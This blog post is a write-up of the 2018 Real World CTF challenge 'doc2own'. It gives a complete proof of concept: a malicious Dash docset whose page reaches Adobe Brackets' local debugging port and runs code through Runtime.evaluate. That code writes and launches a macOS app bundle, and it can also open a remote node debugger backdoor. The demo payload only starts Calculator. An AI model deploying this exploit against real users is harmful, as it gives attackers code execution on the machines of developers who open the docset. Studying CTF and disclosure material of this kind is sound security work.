---
layout:	post
title:	"Something About #realworldctf doc2own"
date:	2018-08-07
image: /img/rwctf.png
show_excerpt: true
---

The challenge is to get a shell when the victim opens a Dash docset. Both Dash and Adobe Brackets are up to date. Actually the intended solution **involves no zero day at all**. This writeup from Team 217 [Real World CTF 2018 — doc2own](https://blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/) (in Traditional Chinese) is the expected solution.

<!-- more -->

## The Intended Solution Without Involving 0day

#### From remote debug to shell

After the [VSCode 9333 debugging port issue](http://bluec0re.blogspot.com/2018/03/cve-2018-7160-pwning-nodejs-developers.html) I looked at some other javascript based desktop applications, especially editors and IDE. I came across this same vulnerability in Adobe Brackets: [CEF remote debugging is vulnerable to dns rebinding attack #14149](https://github.com/adobe/brackets/issues/14149)

It's weird to have a debugging port in production but Brackets does it. Unlike Atom or VSCode, Brackets is based on libCEF and custom node.js runtime binding. The debugging protocol for web frontend is the same as Chromium.

In the original report, exploit requires dns rebinding to get the random websocket uuid to start a debug session, then use DOM manipulation (there was a bug so `Runtime.Evaluate` didn't work) to inject malicious javascript to the frontend context. But node.js runtime can not be accessed so you need a V8 engine bug to achieve native code execution. The libCEF is pretty old so all you need is to grab an n-day exploit. No further sandbox. Unfortunately memory corruption is not what I am familiar with.

There are some special bridged objects in the context: `appshell` and `brackets`. In the challenge you don't really need a shell because `brackets` already gives the filesystem access.

Unrestricted file system access almost equals code execution, but it requires a trigger. There are two functions that can be turned to instant command execution.

1. `brackets.app.openURLInDefaultBrowser` does not limit `file:///` url, so point it to an executable like `.cmd` or `.exe` equals `ShellExecute` on Windows. For macOS we can use `.terminal` or `.sh`.
2. The application bundle on macOS is actually a directory with specific structure. Opening such bundle will execute a file. Method `brackets.app.showOSFolder` can trigger this behavior.

```js
function calc() {
  // use brackets.fs to write your own executable
  // makedir, writeFile, chmod are your friends
  if (brackets.app.getUserDocumentsDirectory().indexOf('/') === 0) {
    brackets.app.showOSFolder('/Applications/Calculator.app');
  } else {
      brackets.app.openURLInDefaultBrowser('file:///C:/windows/system32/calc.exe');
  }
// P.S. brackets.getModule is also available. We can even activate a node debugger backdoor
  const NodeConnection = brackets.getModule("utils/NodeConnection");
  const conn = new NodeConnection();
  conn.connect(true);
  conn.domains.base.enableDebugger(); // enable *:5858 as a backdoor, which accepts connection from another computer. Just attach it with VSCode or other debugger to execute node.js code
}
```

The patch killed dns rebinding, but this port is still open. So what if we can access it from somewhere with no Same Origin Policy?

#### The Dash Part

There was no special reason to choose Dash as this part. Dash is popular for developers, and it has a WebView that can make cross site AJAX if the document has `file:///` origin. The WebView in Dash is the same WebKit engine as Safari, **I don't think someone will burn a Safari 0day exploit in the CTF**.

You may think about directly reading flag from `file:///` via AJAX. Actually this bug has been reported for a while, including the symlink variant, as well as a directory traversal in the GCDWebServer.

![](/img/XHQ-73R0VHZvwNubvKipXg.png)

#### Demo

Looks like both two issues are not so serious, but together they can spawn a remote shell:

* A debugging port that only allows localhost connection
* A web browser without same origin policy

Here's a proof of concept that launches a calculator:

```bash
contents=exploit.docset/Contents
docs=$contents/Resources/Documents

rm -r $contents
mkdir -p $docs

cat > $docs/index.html <<- "EOF"
<script>
async function main() {
  const list = await fetch('http://localhost:9234/json').then(r => r.json());
  const item =  list.find(item => item.url.indexOf('file:///') === 0);
  if (!item) return console.error('invalid response');
  const url = `ws://127.0.0.1:9234/devtools/page/${item.id}`;
  console.log('url:' + url);
  exploit(url);
}
function exploit(url) {
  function calc() {
    const fs = window.appshell.fs;
    const mkdir = path => new Promise((resolve, reject) =>
      fs.makedir(path, 0755, err => err => err === 0 ? resolve(true) : reject(err)));
    const writeFile = (path, content) => new Promise((resolve, reject) =>
      fs.writeFile(path, content, 'utf8', false, err => err === 0 ? resolve(true) : reject(err)));
    const chmod = (path, mode) => new Promise((resolve, reject) =>
      fs.chmod(path, mode, err => err === 0 ? resolve(true) : reject(err)));
    const INFO_PLIST = `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
        <key>CFBundleExecutable</key>
        <string>hello</string>
        <key>CFBundleIconFile</key>
        <string>AppIcon</string>
      </dict>
      </plist>`;
    const EXEC = `#!/bin/sh
      open -a Calculator`;
    const app = '/tmp/test.app/';
    const base = app + 'Contents/'
    return mkdir(base + 'MacOS')
      .then(writeFile(base + 'Info.plist', INFO_PLIST))
      .then(writeFile(base + 'MacOS/hello', EXEC))
      .then(chmod(base + 'MacOS/hello', 0777))
      .then(new Promise((resolve, reject) => {
        brackets.app.showOSFolder(app)
      }));
  }
  const ws = new WebSocket(url);
  ws.onopen = async () => {
    let counter = 13371337;
    const send = (method, params) => new Promise((resolve, reject) => {
      const id = counter++;
      const recv = ({ data }) => {
        const parsed = JSON.parse(data);
        if (parsed.id === id) {
          resolve(parsed.result);
          ws.removeEventListener('message', recv);
        } else {
          console.log('message: ', data);
        }
      };
      ws.addEventListener('message', recv);
      ws.send(JSON.stringify({ id, method, params }));
    });
    const response = await send('Runtime.evaluate', { expression: `(${calc})()` });
    console.log(response.result);
    ws.close();
  }
  ws.onerror = () => console.log('failed to connect');
}
main();
</script>
EOF

cat > $contents/Info.plist <<- "EOF"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleIdentifier</key>
  <string>exploit</string>
  <key>CFBundleName</key>
  <string>Exploit</string>
  <key>DocSetPlatformFamily</key>
  <string>exploit</string>
  <key>dashIndexFilePath</key>
  <string>index.html</string>
  <key>isDashDocset</key>
  <true/>
</dict>
</plist>
EOF

sqlite3 -batch $contents/Resources/docSet.dsidx << "EOF"
CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);
CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);
INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES ('Exploit', 'Class', 'index.html');
EOF

open exploit.docset

tar czf exp.tar.gz exploit.docset
```

[Demo](https://youtu.be/8--cX0BF3ew)

But during the CTF, it didn't cost [Plaid Parliament of Pwning](https://ctftime.org/team/284), [CyKOR](https://ctftime.org/team/369) and [Eat, Sleep, Pwn, Repeat](https://ctftime.org/team/15712) too much time to find real zero day solutions in Dash itself. After the game, I did a quick disassemble and found some other new bugs that have been confirmed by the developer.

After reporting to [Kapeli](https://medium.com/u/f1aac0988a9), he quickly made a new release, and checked the docset repo to make sure there were no actual attack. Thanks for his response!

> The docsets available by default within Dash (including user contributed ones) have been checked and no evidence of these vulnerabilities being exploited has been found.

To protect end users of Dash, I'll not reveal the unintended bugs now. **Please upgrade to Dash 4.4.0 ASAP.**
